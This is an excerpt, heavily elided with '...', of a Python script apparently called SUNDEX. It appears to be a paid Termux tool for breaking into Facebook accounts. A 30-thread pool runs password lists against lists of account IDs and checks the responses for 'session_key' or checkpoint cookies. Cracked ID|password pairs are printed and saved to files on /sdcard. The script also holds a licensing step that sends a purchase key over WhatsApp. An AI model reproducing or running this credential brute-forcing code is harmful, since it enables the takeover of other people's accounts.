...
os.system('xdg-open https://www.facebook.com/profile.php?id=100042015487732&mibextid=ZbWKwL')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100042015487732&mibextid=ZbWKwLapp=fbl');menu()
                        ...
                        tks = ("Hi SUNDEX Sir, I Need To Buy Your Paid SUNDEX PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python SUNDEX.py')
...
def pak():
                ...
                with tred(max_workers=30) as SUNDEX:     
                        ...
                        for psx in user:
                                ...
                                SUNDEX.submit(rndm,ids,passlist)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [SUNDEX-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        SUNDEX=session.cookies.get_dict().keys()
                        ...
                        elif 'checkpoint' in SUNDEX:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [SUNDEX-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [SUNDEX-OK] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/SUNDEX-OK.txt','a').write(ids+'|'+pas+'\n')
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/SUNDEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/SUNDEX-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [SUNDEX-OK] '+uid+' | '+pas+'\033[1;97m')
